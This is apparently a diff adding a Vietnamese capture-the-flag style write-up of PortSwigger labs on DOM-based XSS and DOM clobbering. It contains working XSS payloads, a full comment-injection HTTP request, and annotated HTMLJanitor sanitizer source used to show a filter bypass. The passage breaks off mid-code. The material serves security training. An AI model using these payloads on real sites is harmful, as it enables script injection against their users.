+<p>Body</p>
+<div class="highlight"><pre><span></span><code>&lt;script&gt;
+<span class="nv">location</span><span class="o">=</span><span class="s2">&quot;&lt;url-lab&gt;/product?productId=3#&#39;%3E%3Cimg%20src=x%20onerror=print()%3E%3C&quot;</span><span class="p">;</span>
+&lt;/script&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-exploiting-dom-clobbering-to-enable-xss"><strong>Lab: Exploiting DOM clobbering to enable XSS</strong><a class="headerlink" href="#lab-exploiting-dom-clobbering-to-enable-xss" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering">Lab: Exploiting DOM clobbering to enable XSS | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện xem một bài post bất kỳ. Tại đây, quan sát thấy có một lưu ý là cho phép HTML</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Khi thực hiện comment với payload sau thì handler event đã bị bỏ</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Cơ chế bỏ handler event là nhờ code client side dùng DOMpurify.sanitize để bỏ các attribute của môt tag có hại như handler event.</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, code chỉ thực hiện sanitize author, body của comment mà không validate avatar của comment đồng thời nối trực tiếp vào source <code>innerHTML</code></p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Dù vậy, code be đã ngăn mass asignment nên chúng ta không thể thay đổi trường avatar bằng cách này.</p>
+</li>
+<li>Khi quan sát kỹ chúng ta thấy rằng code sẽ lấy default url nếu không có url của user gửi bằng cách truy cập vào <code>window.defaultAvatar</code></li>
+<li>
+<p>Để thao túng được giá trị <code>window.defaultAvatar</code> chúng ta có thể ghi đè bằng cách thêm hai thẻ cùng <code>id</code> và nhờ vậy thì js sẽ hiểu đây là collection và sẽ chọn cái có name là avatar. Ví dụ, khi chúng ta truyền payload sau thì sẽ nối chuỗi thành công vào avatar (kiểm soát được <code>window.defaultAvatar</code></p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span> <span class="na">name</span><span class="o">=</span><span class="s">avatar</span> <span class="na">href</span><span class="o">=</span><span class="s">a&quot;onerror=alert(1)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên thì ở đây, các ký tự là <code>"</code>  và space bị url encode do thuộc tính href của a khi lấy ra nên sẽ bị encode, trừ khi chúng ta thay href này là một scheme khác như <code>cid</code> thì sẽ được. Như vậy, chúng ta thử như sau</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">defaultAvatar</span> <span class="na">name</span><span class="o">=</span><span class="s">avatar</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;cid:a&quot;onerror=alert(1)//&quot;&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>POST /post/comment HTTP/2
+Host: 0a4000b104c641da808a1cc500a3003b.web-security-academy.net
+Cookie: session=gxIEMspJOUYmDzIynaSJkAJHZxAROYsR
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 275
+
+csrf=ClaCjl2PnanlJtXgUq7CCbT9Mn7Cm4we<span class="err">&amp;</span>postId=9<span class="err">&amp;</span>comment=%3ca%20id%3ddefaultAvatar%3e%3ca%20id%3ddefaultAvatar%20name%3davatar%20href%3d&#39;cid%3aa%22onerror%3dalert(1)%2f%2f%22&#39;%3e<span class="err">&amp;</span>name=%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E<span class="err">&amp;</span>email=a%40a.com<span class="err">&amp;</span>website=http%3A%2F%2Fac.com
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truy cập bài post có comment trên. Quan sát thấy alert thành công, hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-clobbering-dom-attributes-to-bypass-html-filters"><strong>Lab: Clobbering DOM attributes to bypass HTML filters</strong><a class="headerlink" href="#lab-clobbering-dom-attributes-to-bypass-html-filters" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters">Lab: Clobbering DOM attributes to bypass HTML filters | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một post bất kỳ. Tại đây, thực hiện view page source và quan sát thấy khi client code nhận data từ response, sẽ đưa qua hàm sanitize các attributes không hợp lệ đối với các thẻ. Chính vì vậy, khi truyền payload ví dụ <code>'"&gt;&lt;img src=x onerror=alert(1)&gt;</code> thì toàn bộ thẻ img sẽ bị bỏ vì chứ onerror.</p>
+<ul>
+<li>
+<p>POC</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span><span class="k">function</span><span class="w"> </span><span class="o">(</span>root,<span class="w"> </span>factory<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">  </span>//<span class="w"> </span>Universal<span class="w"> </span>Module<span class="w"> </span>Definition:
+<span class="w">  </span>//<span class="w"> </span>Nếu<span class="w"> </span>môi<span class="w"> </span>trường<span class="w"> </span>hỗ<span class="w"> </span>trợ<span class="w"> </span>AMD<span class="w"> </span>thì<span class="w"> </span>define<span class="w"> </span>module<span class="w"> </span>theo<span class="w"> </span>kiểu<span class="w"> </span>AMD.
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span><span class="nv">define</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;function&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>define.amd<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>define<span class="o">(</span><span class="s1">&#39;html-janitor&#39;</span>,<span class="w"> </span>factory<span class="o">)</span><span class="p">;</span>
+
+<span class="w">  </span>//<span class="w"> </span>Nếu<span class="w"> </span>chạy<span class="w"> </span>trong<span class="w"> </span>Node/CommonJS<span class="w"> </span>thì<span class="w"> </span><span class="nb">export</span><span class="w"> </span>bằng<span class="w"> </span>module.exports.
+<span class="w">  </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span><span class="nv">exports</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;object&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>module.exports<span class="w"> </span><span class="o">=</span><span class="w"> </span>factory<span class="o">()</span><span class="p">;</span>
+
+<span class="w">  </span>//<span class="w"> </span>Nếu<span class="w"> </span>chạy<span class="w"> </span>trực<span class="w"> </span>tiếp<span class="w"> </span>trên<span class="w"> </span>browser<span class="w"> </span>thì<span class="w"> </span>gắn<span class="w"> </span>HTMLJanitor<span class="w"> </span>vào<span class="w"> </span>object<span class="w"> </span>global.
+<span class="w">  </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>root.HTMLJanitor<span class="w"> </span><span class="o">=</span><span class="w"> </span>factory<span class="o">()</span><span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="o">}(</span>this,<span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="o">{</span>
+
+<span class="w">  </span>/**
+<span class="w">   </span>*<span class="w"> </span>Hàm<span class="w"> </span>khởi<span class="w"> </span>tạo<span class="w"> </span>HTMLJanitor.
+<span class="w">   </span>*
+<span class="w">   </span>*<span class="w"> </span>@param<span class="w"> </span><span class="o">{</span>Object<span class="o">}</span><span class="w"> </span>config.tags
+<span class="w">   </span>*<span class="w"> </span>Dictionary<span class="w"> </span>chứa<span class="w"> </span>danh<span class="w"> </span>sách<span class="w"> </span>tag<span class="w"> </span>được<span class="w"> </span>cho<span class="w"> </span>phép.
+<span class="w">   </span>*
+<span class="w">   </span>*<span class="w"> </span>Ví<span class="w"> </span>dụ:
+<span class="w">   </span>*<span class="w"> </span><span class="o">{</span>
+<span class="w">   </span>*<span class="w">   </span>tags:<span class="w"> </span><span class="o">{</span>
+<span class="w">   </span>*<span class="w">     </span>a:<span class="w"> </span><span class="o">{</span><span class="w"> </span>href:<span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="o">}</span>,
+<span class="w">   </span>*<span class="w">     </span>b:<span class="w"> </span>true,
+<span class="w">   </span>*<span class="w">     </span>script:<span class="w"> </span><span class="nb">false</span>
+<span class="w">   </span>*<span class="w">   </span><span class="o">}</span>
+<span class="w">   </span>*<span class="w"> </span><span class="o">}</span>
+<span class="w">   </span>*
+<span class="w">   </span>*<span class="w"> </span>@param<span class="w"> </span><span class="o">{</span>boolean<span class="o">}</span><span class="w"> </span>config.keepNestedBlockElements
+<span class="w">   </span>*<span class="w"> </span>Mặc<span class="w"> </span>định<span class="w"> </span>false.<span class="w"> </span>Điều<span class="w"> </span>khiển<span class="w"> </span>việc<span class="w"> </span>có<span class="w"> </span>giữ<span class="w"> </span>block<span class="w"> </span>element<span class="w"> </span>lồng<span class="w"> </span>nhau<span class="w"> </span>hay<span class="w"> </span>không.
+<span class="w">   </span>*/
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>HTMLJanitor<span class="o">(</span>config<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+
+<span class="w">    </span>//<span class="w"> </span>Lấy<span class="w"> </span>danh<span class="w"> </span>sách<span class="w"> </span>rule<span class="w"> </span>cho<span class="w"> </span>từng<span class="w"> </span>tag<span class="w"> </span>từ<span class="w"> </span>config.
+<span class="w">    </span>var<span class="w"> </span><span class="nv">tagDefinitions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>config<span class="o">[</span><span class="s1">&#39;tags&#39;</span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Lấy<span class="w"> </span>tên<span class="w"> </span>các<span class="w"> </span>tag<span class="w"> </span>được<span class="w"> </span>khai<span class="w"> </span>báo<span class="w"> </span>trong<span class="w"> </span>config.
+<span class="w">    </span>var<span class="w"> </span><span class="nv">tags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Object.keys<span class="o">(</span>tagDefinitions<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Kiểm<span class="w"> </span>tra<span class="w"> </span>từng<span class="w"> </span>giá<span class="w"> </span>trị<span class="w"> </span>trong<span class="w"> </span>config.tags.
+<span class="w">    </span>//<span class="w"> </span>Mỗi<span class="w"> </span>tag<span class="w"> </span>chỉ<span class="w"> </span>được<span class="w"> </span>nhận<span class="w"> </span>rule<span class="w"> </span>dạng:
+<span class="w">    </span>//<span class="w"> </span>-<span class="w"> </span>object:<span class="w"> </span>cấu<span class="w"> </span>hình<span class="w"> </span>attribute<span class="w"> </span>chi<span class="w"> </span>tiết
+<span class="w">    </span>//<span class="w"> </span>-<span class="w"> </span>boolean:<span class="w"> </span>true/false<span class="w"> </span>cho<span class="w"> </span>phép<span class="w"> </span>hoặc<span class="w"> </span>chặn<span class="w"> </span>tag
+<span class="w">    </span>//<span class="w"> </span>-<span class="w"> </span><span class="k">function</span>:<span class="w"> </span>hàm<span class="w"> </span>tự<span class="w"> </span>quyết<span class="w"> </span>định<span class="w"> </span>attribute<span class="w"> </span>được<span class="w"> </span>phép
+<span class="w">    </span>var<span class="w"> </span><span class="nv">validConfigValues</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tags
+<span class="w">      </span>.map<span class="o">(</span><span class="k">function</span><span class="o">(</span>k<span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span>typeof<span class="w"> </span>tagDefinitions<span class="o">[</span>k<span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="o">})</span>
+<span class="w">      </span>.every<span class="o">(</span><span class="k">function</span><span class="o">(</span><span class="nb">type</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;object&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;boolean&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;function&#39;</span><span class="p">;</span>
+<span class="w">      </span><span class="o">})</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>config<span class="w"> </span>sai<span class="w"> </span>format<span class="w"> </span>thì<span class="w"> </span>throw<span class="w"> </span>lỗi.
+<span class="w">    </span><span class="k">if</span><span class="o">(</span>!validConfigValues<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span>throw<span class="w"> </span>new<span class="w"> </span>Error<span class="o">(</span><span class="s2">&quot;The configuration was invalid&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>//<span class="w"> </span>Lưu<span class="w"> </span>config<span class="w"> </span>vào<span class="w"> </span>instance<span class="w"> </span>để<span class="w"> </span>dùng<span class="w"> </span>trong<span class="w"> </span>quá<span class="w"> </span>trình<span class="w"> </span>sanitize.
+<span class="w">    </span>this.config<span class="w"> </span><span class="o">=</span><span class="w"> </span>config<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span>//<span class="w"> </span>Danh<span class="w"> </span>sách<span class="w"> </span>các<span class="w"> </span>block<span class="w"> </span>element.
+<span class="w">  </span>//<span class="w"> </span>Dùng<span class="w"> </span>để<span class="w"> </span>xử<span class="w"> </span>lý<span class="w"> </span>logic<span class="w"> </span>block<span class="w"> </span>lồng<span class="w"> </span>block<span class="w"> </span>hoặc<span class="w"> </span>whitespace<span class="w"> </span>quanh<span class="w"> </span>block.
+<span class="w">  </span>var<span class="w"> </span><span class="nv">blockElementNames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>
+<span class="w">    </span><span class="s1">&#39;P&#39;</span>,<span class="w"> </span><span class="s1">&#39;LI&#39;</span>,<span class="w"> </span><span class="s1">&#39;TD&#39;</span>,<span class="w"> </span><span class="s1">&#39;TH&#39;</span>,<span class="w"> </span><span class="s1">&#39;DIV&#39;</span>,
+<span class="w">    </span><span class="s1">&#39;H1&#39;</span>,<span class="w"> </span><span class="s1">&#39;H2&#39;</span>,<span class="w"> </span><span class="s1">&#39;H3&#39;</span>,<span class="w"> </span><span class="s1">&#39;H4&#39;</span>,<span class="w"> </span><span class="s1">&#39;H5&#39;</span>,<span class="w"> </span><span class="s1">&#39;H6&#39;</span>,
+<span class="w">    </span><span class="s1">&#39;PRE&#39;</span>
+<span class="w">  </span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>isBlockElement<span class="o">(</span>node<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>nodeName<span class="w"> </span>thường<span class="w"> </span>là<span class="w"> </span>uppercase<span class="w"> </span>trong<span class="w"> </span>DOM,<span class="w"> </span>ví<span class="w"> </span>dụ<span class="w"> </span><span class="s2">&quot;DIV&quot;</span>,<span class="w"> </span><span class="s2">&quot;P&quot;</span>.
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>blockElementNames.indexOf<span class="o">(</span>node.nodeName<span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span>-1<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span>//<span class="w"> </span>Danh<span class="w"> </span>sách<span class="w"> </span>inline<span class="w"> </span>element.
+<span class="w">  </span>var<span class="w"> </span><span class="nv">inlineElementNames</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>
+<span class="w">    </span><span class="s1">&#39;A&#39;</span>,<span class="w"> </span><span class="s1">&#39;B&#39;</span>,<span class="w"> </span><span class="s1">&#39;STRONG&#39;</span>,<span class="w"> </span><span class="s1">&#39;I&#39;</span>,<span class="w"> </span><span class="s1">&#39;EM&#39;</span>,
+<span class="w">    </span><span class="s1">&#39;SUB&#39;</span>,<span class="w"> </span><span class="s1">&#39;SUP&#39;</span>,<span class="w"> </span><span class="s1">&#39;U&#39;</span>,<span class="w"> </span><span class="s1">&#39;STRIKE&#39;</span>
+<span class="w">  </span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>isInlineElement<span class="o">(</span>node<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>inlineElementNames.indexOf<span class="o">(</span>node.nodeName<span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span>-1<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span>HTMLJanitor.prototype.clean<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="o">(</span>html<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>Tạo<span class="w"> </span>một<span class="w"> </span>document<span class="w"> </span>sandbox<span class="w"> </span>riêng<span class="w"> </span>để<span class="w"> </span>parse<span class="w"> </span>HTML.
+<span class="w">    </span>//<span class="w"> </span>Mục<span class="w"> </span>đích:<span class="w"> </span>không<span class="w"> </span>nhét<span class="w"> </span>thẳng<span class="w"> </span>HTML<span class="w"> </span>vào<span class="w"> </span>document<span class="w"> </span>thật.
+<span class="w">    </span>const<span class="w"> </span><span class="nv">sandbox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>document.implementation.createHTMLDocument<span class="o">(</span><span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Tạo<span class="w"> </span>div<span class="w"> </span>làm<span class="w"> </span>root<span class="w"> </span>container.
+<span class="w">    </span>const<span class="w"> </span><span class="nv">root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sandbox.createElement<span class="o">(</span><span class="s2">&quot;div&quot;</span><span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Parse<span class="w"> </span>chuỗi<span class="w"> </span>HTML<span class="w"> </span>đầu<span class="w"> </span>vào<span class="w"> </span>thành<span class="w"> </span>DOM<span class="w"> </span>node<span class="w"> </span>bên<span class="w"> </span>trong<span class="w"> </span>root.
+<span class="w">    </span>root.innerHTML<span class="w"> </span><span class="o">=</span><span class="w"> </span>html<span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Bắt<span class="w"> </span>đầu<span class="w"> </span>sanitize<span class="w"> </span>từ<span class="w"> </span>root.
+<span class="w">    </span>this._sanitize<span class="o">(</span>sandbox,<span class="w"> </span>root<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Trả<span class="w"> </span>lại<span class="w"> </span>HTML<span class="w"> </span>sau<span class="w"> </span>khi<span class="w"> </span>đã<span class="w"> </span>lọc.
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>root.innerHTML<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span><span class="p">;</span>
+
+<span class="w">  </span>HTMLJanitor.prototype._sanitize<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="o">(</span>document,<span class="w"> </span>parentNode<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>Tạo<span class="w"> </span>TreeWalker<span class="w"> </span>để<span class="w"> </span>duyệt<span class="w"> </span>qua<span class="w"> </span>text<span class="w"> </span>node,<span class="w"> </span>element<span class="w"> </span>node<span class="w"> </span>và<span class="w"> </span>comment<span class="w"> </span>node.
+<span class="w">    </span>var<span class="w"> </span><span class="nv">treeWalker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>createTreeWalker<span class="o">(</span>document,<span class="w"> </span>parentNode<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Lấy<span class="w"> </span>child<span class="w"> </span>đầu<span class="w"> </span>tiên<span class="w"> </span>của<span class="w"> </span>parentNode.
+<span class="w">    </span>var<span class="w"> </span><span class="nv">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>treeWalker.firstChild<span class="o">()</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>parentNode<span class="w"> </span>không<span class="w"> </span>có<span class="w"> </span>con<span class="w"> </span>thì<span class="w"> </span>dừng.
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!node<span class="o">)</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
+
+<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span>//<span class="w"> </span>Nếu<span class="w"> </span>là<span class="w"> </span>text<span class="w"> </span>node.
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>node.nodeType<span class="w"> </span><span class="o">===</span><span class="w"> </span>Node.TEXT_NODE<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+
+<span class="w">        </span>//<span class="w"> </span>Nếu<span class="w"> </span>text<span class="w"> </span>node<span class="w"> </span>chỉ<span class="w"> </span>toàn<span class="w"> </span>whitespace<span class="w"> </span>và<span class="w"> </span>nằm<span class="w"> </span>cạnh<span class="w"> </span>block<span class="w"> </span>element,
+<span class="w">        </span>//<span class="w"> </span>thì<span class="w"> </span>remove<span class="w"> </span>nó.
+<span class="w">        </span>//
+<span class="w">        </span>//<span class="w"> </span>Đây<span class="w"> </span>là<span class="w"> </span>heuristic<span class="w"> </span>để<span class="w"> </span>xử<span class="w"> </span>lý<span class="w"> </span>bug<span class="w"> </span>liên<span class="w"> </span>quan<span class="w"> </span>contenteditable<span class="w"> </span>trên<span class="w"> </span>Firefox.
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>
+<span class="w">          </span>node.data.trim<span class="o">()</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
+<span class="w">          </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">(</span>
+<span class="w">            </span><span class="o">(</span>node.previousElementSibling<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>isBlockElement<span class="o">(</span>node.previousElementSibling<span class="o">))</span>
+<span class="w">            </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>node.nextElementSibling<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>isBlockElement<span class="o">(</span>node.nextElementSibling<span class="o">))</span>
+<span class="w">          </span><span class="o">)</span>
+<span class="w">        </span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">          </span>parentNode.removeChild<span class="o">(</span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">          </span>//<span class="w"> </span>Sau<span class="w"> </span>khi<span class="w"> </span>DOM<span class="w"> </span>thay<span class="w"> </span>đổi,<span class="w"> </span>gọi<span class="w"> </span>lại<span class="w"> </span>_sanitize<span class="w"> </span>từ<span class="w"> </span>parentNode.
+<span class="w">          </span>//<span class="w"> </span>Vì<span class="w"> </span>treeWalker<span class="w"> </span>cũ<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>không<span class="w"> </span>còn<span class="w"> </span>phản<span class="w"> </span>ánh<span class="w"> </span>DOM<span class="w"> </span>mới<span class="w"> </span>chính<span class="w"> </span>xác.
+<span class="w">          </span>this._sanitize<span class="o">(</span>document,<span class="w"> </span>parentNode<span class="o">)</span><span class="p">;</span>
+<span class="w">          </span><span class="k">break</span><span class="p">;</span>
+<span class="w">        </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">          </span>//<span class="w"> </span>Text<span class="w"> </span>bình<span class="w"> </span>thường<span class="w"> </span>thì<span class="w"> </span>giữ<span class="w"> </span>lại.
+<span class="w">          </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">        </span><span class="o">}</span>
+<span class="w">      </span><span class="o">}</span>
+
+<span class="w">      </span>//<span class="w"> </span>Nếu<span class="w"> </span>là<span class="w"> </span>comment<span class="w"> </span>node<span class="w"> </span>thì<span class="w"> </span>xóa.
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>node.nodeType<span class="w"> </span><span class="o">===</span><span class="w"> </span>Node.COMMENT_NODE<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>parentNode.removeChild<span class="o">(</span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">        </span>//<span class="w"> </span>DOM<span class="w"> </span>đã<span class="w"> </span>thay<span class="w"> </span>đổi<span class="w"> </span>nên<span class="w"> </span>sanitize<span class="w"> </span>lại<span class="w"> </span>parent.
+<span class="w">        </span>this._sanitize<span class="o">(</span>document,<span class="w"> </span>parentNode<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="o">}</span>
+
+<span class="w">      </span>//<span class="w"> </span>Kiểm<span class="w"> </span>tra<span class="w"> </span>node<span class="w"> </span>hiện<span class="w"> </span>tại<span class="w"> </span>có<span class="w"> </span>phải<span class="w"> </span>inline<span class="w"> </span>element<span class="w"> </span>không.
+<span class="w">      </span>var<span class="w"> </span><span class="nv">isInline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>isInlineElement<span class="o">(</span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">      </span>var<span class="w"> </span>containsBlockElement<span class="p">;</span>
+
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>isInline<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>//<span class="w"> </span>Nếu<span class="w"> </span>inline<span class="w"> </span>element<span class="w"> </span>chứa<span class="w"> </span>block<span class="w"> </span>element<span class="w"> </span>bên<span class="w"> </span>trong,
+<span class="w">        </span>//<span class="w"> </span>ví<span class="w"> </span>dụ<span class="w"> </span>&lt;a&gt;&lt;div&gt;...&lt;/div&gt;&lt;/a&gt;,
+<span class="w">        </span>//<span class="w"> </span>thì<span class="w"> </span>markup<span class="w"> </span>bị<span class="w"> </span>xem<span class="w"> </span>là<span class="w"> </span>invalid.
+<span class="w">        </span><span class="nv">containsBlockElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Array.prototype.some.call<span class="o">(</span>
+<span class="w">          </span>node.childNodes,
+<span class="w">          </span>isBlockElement
+<span class="w">        </span><span class="o">)</span><span class="p">;</span>
+<span class="w">      </span><span class="o">}</span>
+
+<span class="w">      </span>//<span class="w"> </span>Kiểm<span class="w"> </span>tra<span class="w"> </span>trường<span class="w"> </span>hợp<span class="w"> </span>block<span class="w"> </span>element<span class="w"> </span>bị<span class="w"> </span>lồng<span class="w"> </span>trong<span class="w"> </span>block<span class="w"> </span>element.
+<span class="w">      </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ<span class="w"> </span>&lt;li&gt;&lt;p&gt;abc&lt;/p&gt;&lt;/li&gt;.
+<span class="w">      </span>var<span class="w"> </span><span class="nv">isNotTopContainer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>!!<span class="w"> </span>parentNode.parentNode<span class="p">;</span>
+
+<span class="w">      </span>var<span class="w"> </span><span class="nv">isNestedBlockElement</span><span class="w"> </span><span class="o">=</span>
+<span class="w">            </span>isBlockElement<span class="o">(</span>parentNode<span class="o">)</span>
+<span class="w">            </span><span class="o">&amp;&amp;</span><span class="w"> </span>isBlockElement<span class="o">(</span>node<span class="o">)</span>
+<span class="w">            </span><span class="o">&amp;&amp;</span><span class="w"> </span>isNotTopContainer<span class="p">;</span>
+
+<span class="w">      </span>//<span class="w"> </span>Lấy<span class="w"> </span>tên<span class="w"> </span>tag<span class="w"> </span>dạng<span class="w"> </span>lowercase.
